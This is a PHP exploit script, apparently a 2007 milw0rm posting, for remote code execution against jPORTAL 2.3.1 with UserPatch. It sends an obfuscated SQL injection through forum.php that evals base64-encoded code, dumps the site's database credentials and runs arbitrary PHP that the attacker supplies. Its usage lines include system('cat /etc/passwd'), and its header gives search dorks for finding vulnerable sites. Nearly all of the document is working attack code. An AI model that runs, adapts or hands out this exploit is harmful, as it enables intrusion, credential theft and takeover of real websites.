﻿<?php
#
# jPORTAL 2.3.1 & UserPatch (forum.php) Remote PHP Code Execution Exploit
#
# author: irk4z[at]yahoo.pl
#         http://irk4z.wordpress.com
#
#
# dorks: "powered by jPORTAL 2 & UserPatch"
#        "powered by jPORTAL 2"
#
# greetz: str0ke, wacky, polish under :*
#--------------------------------------------------------------------->

$host = $argv[1];
$path = $argv[2];
$phpcode = $argv[3];

$info = 
"\n#\n".
"# jPORTAL 2.3.1 & UserPatch (forum.php) Remote PHP Code Execution Exploit\n".
"#\n".
"# author: irk4z[at]yahoo.pl\n".
"#         http://irk4z.wordpress.com\n".
"#\n".
"#\n".
"# greetz: str0ke, wacky, polish under :*\n".
"#--------------------------------------------------------------------->\n";
echo $info;

if($argc<4){
	echo "# Obsluga: \n".
		 "#         php host path phpcode \n".
		 "#         php localhost /~jportal/ phpinfo(); \n".
		 "#         php localhost /~jportal/ \"system('uname -a');\" \n".
		 "#         php localhost /~jportal/ \"system('cat /etc/passwd');\"\n".
		 "#\n".		 
		 "# exploit c0ded by irk4z :D";
	die;
}

$data="do=".base64_encode(base64_decode('Z2xvYmFsICRkYl9ob3N0LCAkZGJfdXNlciwgJGRiX3Bhc3MsICRkYl9uYW1lLCAkcHJlZml4OyANCmVjaG8gIlwkZGJfaG9zdCA9ICckZGJfaG9zdCc7XG4iLg0KIlwkZGJfdXNlciA9ICckZGJfdXNlcic7XG4iLg0KIlwkZGJfcGFzcyA9ICckZGJfcGFzcyc7XG4iLg0KIlwkZGJfbmFtZSA9ICckZGJfbmFtZSc7XG4iLg0KIlwkcHJlZml4ID0gJyRwcmVmaXgnO1xuXG5QSFAgQ09ERSBFWEVDVVRJT04gUkVTVUxUOlxuIjs').$phpcode);

$packet = 
"POST {$path}forum.php?cmd=as_readed&category=18000/**/U%6EION/**/S%65LECT/**/1,2,0x223B6576616C286261736536345F6465636F646528245F504F53545B27646F275D29293B6469653B24746D703D22/* HTTP/1.0\r\n".
"Host: {$host}\r\n".
"Content-type: application/x-www-form-urlencoded\r\n".
"Content-length: ".strlen($data)."\r\n\r\n".$data;

$wynik = send($host, 80, $packet);
$tmp = strpos($wynik, '$db_host');
if (empty($tmp)){echo "\nWystapil blad :( Sprawdz poprawnosc danych wejsciowych..\n\n# exploit c0ded by irk4z :D"; }else{
	echo "\n";
	echo "KONFIGURACJA BAZY DANYCH:\n";
	echo substr($wynik, $tmp, strlen($wynik)-$tmp);
	echo "\n\n# exploit c0ded by irk4z :D";
}


function send($host, $port, $packet)
{
 $s = @fsockopen($host, $port);
 if (empty($s)) return;
 fputs($s, $packet); $retu ='';
 while(!feof($s)){$retu.=fgets($s);}
 fclose($s);
 return $retu;
}
?>

# milw0rm.com [2007-12-29]
